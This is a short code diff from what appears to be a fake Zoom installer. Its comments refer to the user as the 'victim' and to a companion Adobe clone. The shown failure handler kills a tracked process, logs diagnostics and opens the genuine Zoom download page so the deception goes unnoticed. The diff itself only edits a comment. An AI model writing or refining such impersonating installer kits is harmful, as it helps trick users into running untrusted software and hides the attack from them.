@@ -674,8 +674,7 @@ function fail(msg, reason) {
   if (psMarker) { killByCmd(psMarker); psMarker = ""; }
   dumpDiagnostics(reason || msg);
   // On any not-installed outcome, open the REAL Zoom download page so the
-  // victim can grab the genuine installer (mirrors the adobe-official
-  // clone's get.adobe.com/acrobat behavior).
+  // victim can grab the genuine installer.
   try { shell.Run("https://zoom.us/download", 1, false); } catch (e) {}
   setStatus(msg);
   $("heading").innerHTML = "Installation could not be completed";
